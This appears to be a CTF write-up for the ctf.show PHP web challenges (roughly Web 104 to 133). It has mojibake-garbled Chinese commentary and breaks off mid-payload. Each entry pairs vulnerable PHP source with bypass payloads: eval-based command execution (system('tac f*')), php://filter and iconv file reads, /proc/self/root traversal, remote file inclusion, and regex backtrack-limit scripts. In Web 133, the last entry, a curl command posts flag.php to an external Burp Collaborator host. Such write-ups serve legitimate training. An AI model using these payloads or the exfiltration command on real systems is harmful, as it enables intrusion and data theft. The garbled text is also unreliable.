$_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 1 1.15 Web 1031 1.16 Web 104 â€” shal() æ•°ç»„ [ ] ç»•è¿‡1æ¢ä¸ªå§¿åŠ¿ 1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 1?v1=1?v2=1 1?v1[]=1?v2[]=2 1aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 1.17 Web 105 â€” å˜é‡è¦†ç›–1&lt;?php highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;;$suces=&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ 1$$key=$$value; #å˜é‡è¦†ç›–ï¼Œå°†å€¼ä½œä¸ºå˜é‡èµ‹ç»™é”®ä½œä¸ºå˜é‡ï¼Œå¦‚æœä¼ å…¥ï¼Œ?suces=flagï¼Œå³ç›¸å½“äº $suces=$flagï¼Œå³å°†$flagçš„å€¼èµ‹ç»™$sucesï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦æƒ³åŠæ³• è¾“å‡º $suces å³å¯ å¯ä»¥çœ‹åˆ°ï¼Œä»…ä»…ä¼ å…¥ä»¥ä¸Šå†…å®¹ï¼Œä¼šæ˜¾ç¤º $error æŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ POSTä¼ å‚ï¼Œå°† $flag çš„å€¼èµ‹ç»™ $error å³å¯ æ€è€ƒ é€šè¿‡ die(suces) 1get: suces=flagpost: flag= é€šè¿‡ die(error) 1get: suces=flagpost: error=suces 1.15 Web 106 â€” shal() æ•°ç»„ [ ] ç»•è¿‡1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 1v1[]=1v2[]=2 1.16 Web 107 â€” parse_str()1&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 1#parse_str($v1,$v2);æŠŠ$1å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ $2å½“ä¸­ï¼Œä»¥æ•°ç»„å½¢å¼get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e 1.17 Web 108 â€” ereg() æˆªæ–­æ¼æ´1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt;error 1#strrev()åè½¬å­—ç¬¦ä¸²#intval()è·å–å˜é‡æ•´æ•°å€¼#0x36d çš„åè¿›åˆ¶æ˜¯ 877 1ereg() å­˜åœ¨00æˆªæ–­æ¼æ´ï¼Œå³%00ä¹‹åçš„å†…å®¹ä¸ä¼šè¿›è¡ŒåŒ¹é…å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é… 1?c=sds%00778 1.18 Web 109 â€” $v1($v2()) å†…ç½®ç±»1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 1#éšä¾¿æ‰¾ä¸ªphpä¸­çš„å†…ç½®ç±»å¹¶ä¸”å¯ä»¥ç›´æ¥echoè¾“å‡ºçš„å°±å¯ä»¥ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;) 1.19 Web 110 â€” new $v1($v2())1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt; 1#FilesystemIteratorç±»è¯»å–æ–‡ä»¶?v1=FilesystemIterator&amp;v2=getcwd 1.20 Web 111 â€” å˜é‡è¦†ç›– â€” $GLOBALS1å˜é‡è¦†ç›– 1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125; &#125;?&gt; è¶…å…¨å±€å˜é‡ $GLOBALS $GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ 1array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; array(8) &#123; [&quot;_GET&quot;]=&gt; array(0) &#123; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;GLOBALS&quot;]=&gt; *RECURSION* [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot; &#125; [&quot;a&quot;]=&gt; int(123) [&quot;b&quot;]=&gt; int(456) [&quot;c&quot;]=&gt; string(4) &quot;asdf&quot;&#125; 1# payload?v1=ctfshow&amp;v2=GLOBALS# å°† $GLOBALS èµ‹å€¼ç»™ v2 , v2 å†èµ‹å€¼ç»™ v1 , ç„¶åå† var_dump($v1)ï¼Œå°±ç›¸å½“äº var_dump($GLOBALS) 1.21 Web 112 â€” å„ç§ç¼–ç ç»•è¿‡ convert.iconv.UCS-2LE.UCS-2BE1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1&lt;?phpecho iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;);# ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;? 1# payload?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php# å¾—åˆ° f$al=gc&quot;fthswod&#123;3c00bd-8cf124-2b-53b4da-72598e1bb4&#125;7;&quot;# è§£ç å¾—åˆ° flag https://www.php.net/manual/zh/mbstring.supported-encodings.php 1# å¦è§£?file=php://filter/resource=flag.php?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php#?file=compress.bzip2://flag.php# åˆ«çš„ä¸€äº›ç¼–ç ç»•è¿‡?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php?file=compress.zlib://flag.php?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 1.22 Web 113 â€” /proc/self/root å¤šæ¬¡é‡å¤1&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1# è¿‡æ»¤ filter å¯ä½¿ç”¨ zlib?file=compress.zlib://flag.php 1# å¦è§£?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php# /proc/self/root åœ¨ Linux å½“ä¸­æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ å¤šæ¬¡é‡å¤å¯ç»•è¿‡# ls /proc/self/root å¾—åˆ°çš„å°†ä¼šæ˜¯æ ¹ç›®å½•çš„æ–‡ä»¶ 1.23 Web 114 â€” filter1&lt;?phperror_reporting(0);highlight_file(__FILE__); function filter($file)&#123; if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;;if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼ 1# filter æœªè¢«è¿‡æ»¤?file=php://filter/resource=flag.php 1.24 Web 115 â€” trim() %0c ç»•è¿‡1&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123; $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123; if($num==&#x27;36&#x27;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125;&#125;else&#123; echo &quot;hacker!!!&quot;;&#125; hacker!!! 1# æµ‹è¯•&lt;?phpfor ($i=0; $i &lt;=128 ; $i++) &#123; $x=chr($i).&#x27;1&#x27;; if(trim($x)!==&#x27;1&#x27; &amp;&amp; is_numeric($x))&#123; echo urlencode(chr($i)).&quot;\\n&quot;; &#125;&#125;# %0C %2B - . 0 1 2 3 4 5 6 7 8 9 1?num=%0c36 1.25 Web 123 â€” $a=$_SERVER[â€˜argvâ€™];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1# å˜é‡ååº”è¯¥åªæœ‰ å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿# GET æˆ– POSTæ–¹å¼ä¼ è¿›å»çš„å˜é‡å,ä¼šè‡ªåŠ¨å°† ç©ºæ ¼ + . [ è½¬æ¢ä¸º _ ï¼Œé‡ç‚¹æ˜¯ ä»…ä»…æ›¿æ¢ä¸€æ¬¡ 1# payloadfun=echo $flag&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2fun=$fl0g=%27flag_give_me%27&amp;CTF_SHOW=1&amp;CTF[SHOW.COM=2 #ä¸è¡ŒCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=var_dump($GLOBALS) #ä¸è¡Œ $a=$_SERVER[â€˜argvâ€™]; 11ã€cliæ¨¡å¼ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸‹ ç¬¬ä¸€ä¸ªå‚æ•°$_SERVER[&#x27;argv&#x27;][0]æ˜¯è„šæœ¬åï¼Œå…¶ä½™çš„æ˜¯ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°2ã€webç½‘é¡µæ¨¡å¼ä¸‹ åœ¨webé¡µæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™] $argv,$argcåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨ 1# é¢„æœŸè§£get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])# æµ‹è¯•&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);ä¼ å…¥ a=1+fl0g=flag_give_meç»“æœå¦‚ä¸‹array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125; 1# å¦è§£POST CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])GET /?$fl0g=flag_give_meGET:?$fl0g=flag_give_mePOST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 1# æµ‹è¯• Web php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ | è®¾ç½®register_argc_argv = On 1.26 Web 125 â€” $a=$_SERVER[â€˜argvâ€™];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.27 Web 126 â€” $a=$_SERVER[â€˜argvâ€™];1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; 1get: ?a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 1.28 Web 127 â€” extract($_GET); å’Œ ç©ºæ ¼ ç»•è¿‡ _1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show = md5($flag);$url = $_SERVER[&#x27;QUERY_STRING&#x27;];//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹function waf($url)&#123; if(preg_match(&#x27;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#x27;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//&#x27;, $url))&#123; return true; &#125;else&#123; return false; &#125;&#125;if(waf($url))&#123; die(&quot;å—¯å“¼ï¼Ÿ&quot;);&#125;else&#123; extract($_GET);&#125;if($ctf_show===&#x27;ilove36d&#x27;)&#123; echo $flag;&#125; â€˜QUERY_STRINGâ€™ query stringï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œé€šè¿‡å®ƒè¿›è¡Œé¡µé¢è®¿é—®ã€‚ https://www.php.net/manual/zh/reserved.variables.server.php 1# + [ . ç©ºæ ¼ ä¼šå˜æˆ _ # extract($_GET); çš„ä½œç”¨å³æ˜¯å°†æˆ‘ä»¬çš„ GET ä¼ å…¥çš„å‚æ•°å˜æˆå®æ‰“å®çš„å˜é‡?ctf show=ilove36d 1.29 Web 128 â€” gettext æ‰©å±• â€” get_defined_vars()1&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$f1 = $_GET[&#x27;f1&#x27;];$f2 = $_GET[&#x27;f2&#x27;];if(check($f1))&#123; var_dump(call_user_func(call_user_func($f1,$f2)));&#125;else&#123; echo &quot;å—¯å“¼ï¼Ÿ&quot;;&#125;function check($str)&#123; return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);&#125; NULL gettext æ‰©å±• æŸ¥çœ‹php æ‰©å±•ç›®å½•ä¸‹æ˜¯å¦æœ‰ php_gettext.dll ä¿®æ”¹ php.ini extension=php_gettext.dll å»æ‰æ³¨é‡Š php ä¸‹çš„ gettext æ‰©å±•ä½¿ç”¨ æµ‹è¯• 1&lt;?phpecho gettext(&#x27;phpinfo&#x27;);echo _(&#x27;phpinfo&#x27;);?&gt;# å¦‚æœæ˜¯æœªå®šä¹‰çš„å­—ç¬¦ï¼Œåˆ™å°†ä¼šè¿”å›åŸå­—ç¬¦ä¸²root@kali:/var/www/html/learn# vi 3.phproot@kali:/var/www/html/learn# php 3.php phpinfophpinfo 1get_defined_vars( void) : arrayè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ # æµ‹è¯•&lt;?php$a = get_defined_vars();print_r($a);?&gt;# è¿”å›Array( [_GET] =&gt; Array ( [ctfshow] =&gt; ilove36d ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) [test] =&gt; Success!) 1?f1=_&amp;f2=get_defined_vars# è§£é‡Švar_dump(call_user_func(call_user_func($f1,$f2)));var_dump(call_user_func(call_user_func(&#x27;_&#x27;,&#x27;get_defined_vars&#x27;)));var_dump(call_user_func(get_defined_vars)); 1.30 Web 129 â€” GET ä¸­å¿…é¡»å«æœ‰æŸå†…å®¹1&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;f&#x27;]))&#123; $f = $_GET[&#x27;f&#x27;]; if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123; echo readfile($f); &#125;&#125; 1stripos() # æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰,ä»0å¼€å§‹ 1# è§£ä¸€# è¿œç¨‹æ–‡ä»¶åŒ…å« åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™ä¸Šä¸€å¥è¯ test.txt?f=http://url/test.txt?ctfshow 1# è§£äºŒ# filter ä¼ªåè®®?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php 1# è§£ä¸‰# ç›®å½•ç©¿è¶Š?f=/ctfshow/../../../../../var/www/html/flag.php 1.31 Web 130 â€” æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡https://www.jb51.net/article/49631.htm 1very very veryï¼ˆçœç•¥25ä¸‡ä¸ªveryï¼‰ctfshow 1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = $_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; è€ƒå¯Ÿç‚¹ï¼šåˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡ PHP ä¸ºäº†é˜²æ­¢æ­£åˆ™è¡¨è¾¾å¼çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆreDOSï¼‰ï¼Œç»™ pcre è®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ pcre.backtrack_limitå›æº¯æ¬¡æ•°ä¸Šé™é»˜è®¤æ˜¯ 100 ä¸‡ã€‚å¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡äº† 100 ä¸‡ï¼Œpreg_match å°†ä¸å†è¿”å›é 1 å’Œ 0ï¼Œè€Œæ˜¯ falseã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº† 1import requestsurl=&quot;http://039253c3-1444-428e-9301-1eadc5f79ab4.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1# éé¢„æœŸè§£f=ctfshowf[]=ctfshow 1.32 Web 131 â€” æ­£åˆ™æœ€å¤§å›æº¯æ¬¡æ•°ç»•è¿‡1&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;f&#x27;]))&#123; $f = (String)$_POST[&#x27;f&#x27;]; if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123; die(&#x27;bye!&#x27;); &#125; if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123; die(&#x27;bye!!&#x27;); &#125; echo $flag;&#125; 1import requestsurl=&quot;http://4a5d7bd2-7fc7-4a6f-90bd-8eef9693bf0a.challenge.ctf.show:8080/&quot;data=&#123; &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url,data=data)print(r.text) 1.33 Web 132 â€” false &amp;&amp; false || $username ===â€adminâ€ä¸€ä¸ª Web é¡µé¢ æ‰«æåå° 1&lt;?php#error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123; $username = (String)$_GET[&#x27;username&#x27;]; $password = (String)$_GET[&#x27;password&#x27;]; $code = (String)$_GET[&#x27;code&#x27;]; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123; if($code == &#x27;admin&#x27;)&#123; echo $flag; &#125; &#125;&#125; 1# payload?username=admin&amp;password=1&amp;code=admin 1.34 Web 133 â€” æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œhttps://blog.csdn.net/qq_46091464/article/details/109095382 1&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($F = @$_GET[&#x27;F&#x27;])&#123; if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;); &#125;&#125; åˆ†æ 1å¦‚æœä¼ å…¥ ?F=` $F`;sleep 5åˆ™ substr($F,0,6) åå¾—åˆ° ` $F`;å³æ‰§è¡Œ eval(` $F`;);ä¹Ÿå°±æ˜¯ eval(` ` $F`;sleep 5`;);è€Œ `` ä¸ shell_exec() ä¸€è‡´åˆ™ eval(shell_exec(&quot; ` $F`;sleep 5&quot;));æµ‹è¯•å çœŸçš„ æ‰§è¡Œäº† sleep 5 é¢˜ç›®è½¬æ¢æˆï¼šæ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ³•ä¸€ 1?F=`$F`;curl -X POST -F xx=@flag.php http://66ahgg5hlpg29qz2ehu6mn5hh8n1bq.burpcollaborator.net?F=`$F`;+curl 